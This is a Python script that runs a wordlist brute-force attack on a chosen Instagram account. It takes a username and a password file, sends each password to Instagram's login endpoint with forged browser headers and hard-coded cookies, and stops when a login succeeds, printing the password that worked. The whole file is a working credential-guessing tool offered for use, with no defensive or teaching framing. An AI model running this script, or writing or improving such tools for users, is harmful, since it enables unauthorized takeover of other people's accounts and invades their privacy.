import requests
import json
import time

def instagram_login(username, password):
    """
    Attempts to log in to Instagram with the given username and password.

    Args:
        username (str): The Instagram username.
        password (str): The Instagram password.

    Returns:
        dict: A response from the login attempt.
    """
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "X-CSRFToken": "EP51Ep0IE2HWptZnj6kkto",
        "Referer": "https://www.instagram.com/",
        "X-Ig-App-Id": "936619743392459",
        "X-Requested-With": "XMLHttpRequest",
        "X-Instagram-Ajax": "1018892011",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Asbd-Id": "129477",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.instagram.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
    }

    cookies = {
        "ig_did": "04E26005-61BF-40E8-9DD2-C9FEAFBA2AE4",
        "csrftoken": "EP51Ep0IE2HWptZnj6kkto",
        "datr": "ObBfZ1hpYWN1_zDsxZDEpV_A",
        "dpr": "1.25",
        "mid": "Z1-wOQALAAFK7Wydjeowm8VfOU-v",
        "wd": "718x567",
    }

    session = requests.Session()
    session.headers.update(headers)
    session.cookies.update(cookies)

    response = session.get("https://www.instagram.com/accounts/login/")
    if "csrftoken" in response.cookies:
        csrf_token = response.cookies["csrftoken"]
        session.headers.update({"X-CSRFToken": csrf_token})

    payload = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
    }

    try:
        response = session.post(url, data=payload)
        return response.json()
    except Exception as e:
        print(f"An error occurred: {e}")
        return {}

if __name__ == "__main__":
    username = input("username: ")
    file_path = input("wordlist: ")

    try:
        with open(file_path, "r") as file:
            lines = file.readlines()

        for line in lines:
            password = line.strip()
            print(f"attempting login for @{username} | password {password}")
            response = instagram_login(username, password)

            if response.get("authenticated"):
                print(f"\033[92mlogin successful | @{username} with password | password {password}\033[0m")  # Green text
                break
            else:
                print(f"\033[91mlogin failed | @{username} | unknown error\033[0m")  # Red text

    except FileNotFoundError:
        print("error: file not found. please provide a valid file path.")
    except Exception as e:
        print(f"an unexpected error occurred: {e}")
